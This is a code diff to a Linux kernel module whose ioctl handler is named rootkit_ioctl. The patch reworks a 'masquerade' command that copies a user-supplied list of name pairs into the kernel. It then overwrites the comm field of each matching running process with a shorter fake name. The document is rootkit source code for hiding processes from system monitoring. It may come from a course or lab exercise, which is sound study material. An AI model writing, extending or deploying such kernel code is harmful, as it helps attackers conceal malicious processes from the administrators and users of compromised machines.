@@ -43,7 +43,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 	int i;
 	struct task_struct *p;
 	struct masq_proc_req *req;
-	struct masq_proc_req *usr_rq;
+	struct masq_proc_req *usr_req;
 	pr_info("%s\n", __func__);
 
 	switch (ioctl) {
@@ -60,12 +60,12 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 	case IOCTL_MOD_MASQ:
 		n = sizeof(struct masq_proc_req);
 		req = kmalloc(n, GFP_KERNEL);
-		usr_rq = (struct masq_proc_req *)arg;
+		usr_req = (struct masq_proc_req *)arg;
 		if (!req) {
 			ret = -ENOMEM;
 			goto masq_break;
 		}
-		if (copy_from_user(req, usr_rq, n)) {
+		if (copy_from_user(req, usr_req, n)) {
 			ret = -EFAULT;
 			goto masq_break;
 		}
@@ -76,19 +76,23 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			ret = -ENOMEM;
 			goto masq_break;
 		}
-
-		n = sizeof(struct masq_proc);
-		for (i = 0; i < req->len; i++) {
-			if (copy_from_user(req->list+i, &usr_rq->list[i], n)) {
-				ret = -EFAULT;
-				goto masq_break;
-			}
-			pr_info("req->list[%d]: %s, %s", i,
-					req->list[i].orig_name,
-					req->list[i].new_name);
+		if (copy_from_user(req->list, usr_req->list, n)) {
+			ret = -EFAULT;
+			goto masq_break;
 		}
 
-		for_each_process(p) {
+		for (i = 0; i < req->len; i++) {
+			char *orig_name, *new_name;
+			int orig_len, new_len;
+			orig_name = req->list[i].orig_name;
+			new_name = req->list[i].new_name;
+			orig_len = strlen(orig_name);
+			new_len = strlen(new_name);
+			if (new_len >= orig_len)
+				continue;
+			for_each_process(p)
+				if (strncmp(p->comm, orig_name, orig_len) == 0)
+					strncpy(p->comm, new_name, sizeof(p->comm));
 		}
 masq_break:
 		if (req)
